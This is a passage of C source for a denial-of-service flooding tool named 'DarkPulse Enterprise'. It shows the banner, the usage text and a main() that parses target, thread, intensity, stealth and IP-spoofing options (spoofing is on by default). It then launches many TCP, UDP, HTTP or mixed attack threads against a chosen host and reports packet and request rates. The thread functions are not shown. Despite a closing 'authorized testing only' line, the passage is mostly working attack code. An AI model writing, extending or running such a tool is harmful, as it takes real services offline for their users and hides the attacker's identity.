    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                DARKPULSE ENTERPRISE v1.0                   ║\n");
    printf("║          High-Performance DDoS Testing Tool               ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("\n");
}

void print_usage() {
    printf("USAGE: sudo ./darkpulse_enterprise <TARGET> [OPTIONS]\n\n");
    printf("OPTIONS:\n");
    printf("  -p PORT        Target port (default: 80)\n");
    printf("  -t THREADS     Number of threads (default: 50, max: %d)\n", MAX_THREADS);
    printf("  -d SECONDS     Attack duration (default: 300)\n");
    printf("  -a ATTACK      Attack type: 1=TCP, 2=UDP, 3=HTTP, 4=MIXED (default: 4)\n");
    printf("  -i INTENSITY   Attack intensity 1-100 (default: 70)\n");
    printf("  -s LEVEL       Stealth level 1-5 (default: 3)\n");
    printf("  --no-spoof     Disable IP spoofing\n");
    printf("\n");
    printf("EXAMPLES:\n");
    printf("  sudo ./darkpulse example.com -p 80 -t 100 -a 4 -i 80\n");
    printf("  sudo ./darkpulse 192.168.1.100 -t 50 -a 2 -d 600\n");
    printf("  sudo ./darkpulse  203.0.113.10 -p 443 -a 3 -t 80\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_banner();
        print_usage();
        return 1;
    }
    
    // Check root privileges
    if (geteuid() != 0) {
        printf("[-] ERROR: Root privileges required for raw socket operations\n");
        printf("[-] Run with: sudo %s <target>\n", argv[0]);
        return 1;
    }
    
    // Setup signal handling
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Initialize global log
    global_log_file = fopen("darkpulse_enterprise.log", "a");
    if (!global_log_file) {
        global_log_file = stderr;
    }
    
    // Parse command line arguments
    char target[256] = {0};
    char target_ip[INET6_ADDRSTRLEN] = {0};
    char target_ipv4[INET_ADDRSTRLEN] = {0};
    int ip_version = 4;
    int port = 80;
    int num_threads = 50;
    int attack_type = 4; // Mixed
    int duration = 300;
    int intensity = 70;
    int stealth_level = 3;
    int spoof_ip = 1; // Enabled by default
    
    // Use snprintf instead of strncpy to avoid truncation warnings
    snprintf(target, sizeof(target), "%s", argv[1]);
    
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            num_threads = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-a") == 0 && i + 1 < argc) {
            attack_type = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            duration = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            intensity = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
            stealth_level = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--no-spoof") == 0) {
            spoof_ip = 0;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage();
            return 0;
        }
    }
    
    // Validate target (supports both IP and domain names)
    if (!validate_target(target, target_ip, sizeof(target_ip), &ip_version)) {
        printf("[-] ERROR: Cannot resolve target: %s\n", target);
        printf("[-] Please check the target address or DNS resolution\n");
        return 1;
    }
    
    // For IPv4, also store in IPv4 format using snprintf
    if (ip_version == 4) {
        snprintf(target_ipv4, sizeof(target_ipv4), "%s", target_ip);
    } else {
        printf("[-] WARNING: IPv6 detected (%s), but raw IPv6 sockets not fully implemented\n", target_ip);
        printf("[-] Falling back to IPv4-only raw sockets\n");
        // For demonstration, we'll proceed but note the limitation
    }
    
    // Check system limits
    if (!check_system_limits(num_threads)) {
        printf("[-] WARNING: System limits may affect performance\n");
    }
    
    // Validate and clamp values
    if (num_threads > MAX_THREADS) num_threads = MAX_THREADS;
    if (num_threads < 1) num_threads = 1;
    if (attack_type < 1 || attack_type > 4) attack_type = 4;
    if (intensity > 100) intensity = 100;
    if (intensity < 1) intensity = 1;
    if (stealth_level > 5) stealth_level = 5;
    if (stealth_level < 1) stealth_level = 1;
    if (port <= 0 || port > 65535) port = 80;
    
    print_banner();
    printf("[+] Target: %s -> %s (IPv%d)\n", target, target_ip, ip_version);
    printf("[+] Threads: %d | Attack Type: %d | Duration: %ds | Intensity: %d%%\n", 
           num_threads, attack_type, duration, intensity);
    printf("[+] Stealth Level: %d/5 | IP Spoofing: %s\n", 
           stealth_level, spoof_ip ? "Enabled" : "Disabled");
    printf("[+] Features: Thread-Safe Counters | Zero-malloc Packets | System Limit Checks\n");
    
    printf("[+] Initializing enterprise attack threads...\n");
    
    // Initialize CURL globally once
    init_curl_global();
    
    // Initialize attack configurations
    attack_config_t *configs = (attack_config_t *)calloc(num_threads, sizeof(attack_config_t));
    pthread_t *threads = (pthread_t *)calloc(num_threads, sizeof(pthread_t));
    
    if (!configs || !threads) {
        printf("[-] ERROR: Memory allocation failed\n");
        cleanup_curl_global();
        return 1;
    }
    
    int successful_threads = 0;
    
    for (int i = 0; i < num_threads; i++) {
        memset(&configs[i], 0, sizeof(attack_config_t));
        
        // Use snprintf instead of strncpy to avoid truncation warnings
        snprintf(configs[i].target_ip, sizeof(configs[i].target_ip), "%s", target_ip);
        
        if (ip_version == 4) {
            snprintf(configs[i].target_ipv4, sizeof(configs[i].target_ipv4), "%s", target_ipv4);
        }
        
        configs[i].ip_version = ip_version;
        configs[i].target_port = port;
        configs[i].thread_id = i;
        configs[i].running = &running;
        configs[i].attack_type = attack_type;
        configs[i].intensity = intensity * 3;
        if (configs[i].intensity > MAX_RATE) configs[i].intensity = MAX_RATE;
        configs[i].duration = duration;
        configs[i].stealth_level = stealth_level * 20;
        configs[i].spoof_ip = spoof_ip;
        configs[i].tcp_socket_fd = -1;
        configs[i].udp_socket_fd = -1;
        configs[i].icmp_socket_fd = -1;
        
        // Initialize counters (already zeroed by calloc)
        
        // Choose thread function based on attack type
        void *(*thread_func)(void *) = NULL;
        
        switch (attack_type) {
            case 1:
                thread_func = tcp_attack_thread;
                break;
            case 2:
                thread_func = udp_attack_thread;
                break;
            case 3:
                thread_func = http_attack_thread;
                break;
            case 4:
                thread_func = mixed_attack_thread;
                break;
        }
        
        if (pthread_create(&threads[i], NULL, thread_func, &configs[i]) == 0) {
            successful_threads++;
        } else {
            printf("[-] Failed to create thread %d\n", i);
            break;
        }
        
        usleep(5000); // Reduced stagger for faster startup
    }
    
    printf("[+] Started %d enterprise attack threads\n", successful_threads);
    
    if (successful_threads == 0) {
        printf("[-] ERROR: No threads were created successfully\n");
        free(configs);
        free(threads);
        cleanup_curl_global();
        return 1;
    }
    
    // Start monitor thread
    monitor_data_t *monitor_data = (monitor_data_t *)malloc(sizeof(monitor_data_t));
    if (!monitor_data) {
        printf("[-] ERROR: Memory allocation failed for monitor\n");
        running = 0;
    } else {
        monitor_data->configs = configs;
        monitor_data->num_threads = successful_threads;
        monitor_data->running = &running;
        monitor_data->start_time = time(NULL);
        
        pthread_t monitor_thread;
        if (pthread_create(&monitor_thread, NULL, monitor_thread_func, monitor_data) != 0) {
            printf("[-] Failed to create monitor thread\n");
            free(monitor_data);
            running = 0;
        } else {
            printf("[+] Enterprise attack running. Press Ctrl+C to stop and see final results.\n");
            
            // Main loop
            time_t start_time = time(NULL);
            while (running) {
                sleep(1);
                
                // Check if duration completed
                if (time(NULL) - start_time >= duration) {
                    printf("[+] Attack duration completed\n");
                    running = 0;
                    break;
                }
            }
            
            pthread_join(monitor_thread, NULL);
        }
    }
    
    printf("[+] Stopping all threads...\n");
    
    // Wait for all threads to finish
    for (int i = 0; i < successful_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Calculate final statistics
    unsigned long total_packets = 0;
    unsigned long total_http = 0;
    unsigned long total_errors = 0;
    unsigned long total_success_packets = 0;
    unsigned long total_success_http = 0;
    
    pthread_mutex_lock(&stats_mutex);
    for (int i = 0; i < successful_threads; i++) {
        total_packets += configs[i].packets_sent;
        total_http += configs[i].http_requests;
        total_errors += configs[i].errors;
        total_success_packets += configs[i].successful_packets;
        total_success_http += configs[i].successful_http;
        
        // Close any remaining sockets
        close_sockets(&configs[i]);
    }
    pthread_mutex_unlock(&stats_mutex);
    
    double total_duration = duration;
    double pps = (total_duration > 0 && total_packets > 0) ? total_packets / total_duration : 0.0;
    double rps = (total_duration > 0 && total_http > 0) ? total_http / total_duration : 0.0;
    
    double packet_success_rate = total_packets > 0 ? 
        (double)total_success_packets / total_packets * 100.0 : 0.0;
    
    double http_success_rate = total_http > 0 ? 
        (double)total_success_http / total_http * 100.0 : 0.0;
    
    // Display final results
    printf("\n╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                   ENTERPRISE ATTACK RESULTS                ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");
    
    printf("📊 PERFORMANCE STATISTICS:\n");
    printf("   • Duration:        %.1f seconds\n", total_duration);
    printf("   • Total Packets:   %lu (%.1f pps)\n", total_packets, pps);
    printf("   • HTTP Requests:   %lu (%.1f rps)\n", total_http, rps);
    printf("   • Total Errors:    %lu\n", total_errors);
    
    printf("\n🎯 SUCCESS RATES:\n");
    printf("   • Packet Success:  %.1f%% (%lu/%lu)\n", packet_success_rate, total_success_packets, total_packets);
    printf("   • HTTP Success:    %.1f%% (%lu/%lu)\n", http_success_rate, total_success_http, total_http);
    
    printf("\n⚡ ENTERPRISE FEATURES USED:\n");
    printf("   • Thread-Safe Counters:  Eliminated data races\n");
    printf("   • Pre-allocated Buffers: Zero malloc/free per packet\n");
    printf("   • Burst Packet Sending:  Improved throughput\n");
    printf("   • System Limit Checks:   Prevented resource exhaustion\n");
    
    // Cleanup
    free(configs);
    free(threads);
    cleanup_curl_global();
    
    if (global_log_file != stderr) {
        fclose(global_log_file);
    }
    
    printf("\n[+] Enterprise attack completed. Logs saved to: darkpulse_enterprise.log\n");
    printf("[!] REMINDER: This tool is for authorized testing only.\n");
    
    return 0;
}
